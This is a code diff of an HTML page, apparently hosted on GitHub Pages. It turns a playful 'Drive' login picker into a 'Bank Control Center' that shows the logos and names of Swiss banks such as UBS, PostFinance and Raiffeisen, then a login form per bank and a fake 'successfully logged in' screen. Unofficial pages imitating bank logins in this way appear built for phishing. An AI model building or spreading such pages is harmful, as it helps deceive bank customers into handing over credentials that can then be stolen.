@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drive Control Center</title>
+    <title>Bank Control Center</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,6 @@
             min-height: 100vh;
         }
 
-        /* ── STARTSEITE ── */
         #startView {
             text-align: center;
             padding: 40px 20px;
@@ -30,12 +29,6 @@
             color: #1a1a1a;
             font-size: 1.8em;
             font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        #startView p {
-            color: #666;
-            font-size: 0.95em;
             margin-bottom: 40px;
         }
 
@@ -77,7 +70,6 @@
             font-weight: 600;
         }
 
-        /* ── LOGIN / ERFOLG ── */
         .box {
             display: none;
             width: 100%;
@@ -173,7 +165,6 @@
             background-color: #2ea44f;
         }
 
-        /* ── ERFOLG ── */
         .success-screen {
             text-align: center;
         }
@@ -226,28 +217,27 @@
 
     <!-- STARTSEITE -->
     <div id="startView">
-        <h1>Control Center</h1>
-        <p>Wähle deinen Drive</p>
+        <h1>Wählen Sie Ihre Bank</h1>
         <div class="drive-grid">
-            <div class="drive-card" onclick="openLogin('Hyperdrive', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/unnamed.png?raw=true')">
-                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/unnamed.png?raw=true" class="drive-img" alt="Hyperdrive">
-                <div class="name">Hyperdrive</div>
+            <div class="drive-card" onclick="openLogin('Raiffeisen', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/unnamed.png?raw=true')">
+                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/unnamed.png?raw=true" class="drive-img" alt="Raiffeisen">
+                <div class="name">Raiffeisen</div>
             </div>
-            <div class="drive-card" onclick="openLogin('Bananendrive', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/images.png?raw=true')">
-                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/images.png?raw=true" class="drive-img" alt="Bananendrive">
-                <div class="name">Bananendrive</div>
+            <div class="drive-card" onclick="openLogin('BLKB', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/images.png?raw=true')">
+                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/images.png?raw=true" class="drive-img" alt="BLKB">
+                <div class="name">BLKB</div>
             </div>
-            <div class="drive-card" onclick="openLogin('Eyridrive', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/csm_akb-image_badfd2a611.webp?raw=true')">
-                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/csm_akb-image_badfd2a611.webp?raw=true" class="drive-img" alt="Eyridrive">
-                <div class="name">Eyridrive</div>
+            <div class="drive-card" onclick="openLogin('AKB', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/csm_akb-image_badfd2a611.webp?raw=true')">
+                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/csm_akb-image_badfd2a611.webp?raw=true" class="drive-img" alt="AKB">
+                <div class="name">AKB</div>
             </div>
-            <div class="drive-card" onclick="openLogin('Sukukdrive', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/UBS-c7036cca.png?raw=true')">
-                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/UBS-c7036cca.png?raw=true" class="drive-img" alt="Sukukdrive">
-                <div class="name">Sukukdrive</div>
+            <div class="drive-card" onclick="openLogin('UBS', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/UBS-c7036cca.png?raw=true')">
+                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/UBS-c7036cca.png?raw=true" class="drive-img" alt="UBS">
+                <div class="name">UBS</div>
             </div>
-            <div class="drive-card" onclick="openLogin('Chikennuggetdrive', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/postfinance-neues-logo-001.png?raw=true')">
-                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/postfinance-neues-logo-001.png?raw=true" class="drive-img" alt="Chikennuggetdrive">
-                <div class="name">Chikennuggetdrive</div>
+            <div class="drive-card" onclick="openLogin('PostFinance', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/postfinance-neues-logo-001.png?raw=true')">
+                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/postfinance-neues-logo-001.png?raw=true" class="drive-img" alt="PostFinance">
+                <div class="name">PostFinance</div>
             </div>
         </div>
     </div>
@@ -275,7 +265,7 @@
         <div class="success-screen">
             <div class="success-icon">✓</div>
             <h2>Erfolgreich angemeldet</h2>
-            <p id="successText">Willkommen im Control Center.</p>
+            <p id="successText">Willkommen.</p>
             <button class="home-btn" onclick="goHome()">← Zurück zur Startseite</button>
         </div>
     </div>
@@ -285,9 +275,9 @@
 
         let currentDrive = "";
 
-        function openLogin(driveName, logoUrl) {
-            currentDrive = driveName;
-            document.getElementById('loginTitle').textContent = driveName + ' Login';
+        function openLogin(bankName, logoUrl) {
+            currentDrive = bankName;
+            document.getElementById('loginTitle').textContent = bankName + ' Login';
             document.getElementById('loginLogo').src = logoUrl;
             document.getElementById('loginForm').reset();
 
@@ -316,7 +306,7 @@
             });
 
             document.getElementById('successText').textContent =
-                'Willkommen im ' + currentDrive + ' Control Center.';
+                'Willkommen bei ' + currentDrive + '.';
 
             document.getElementById('loginView').style.display   = 'none';
             document.getElementById('successView').style.display = 'block';
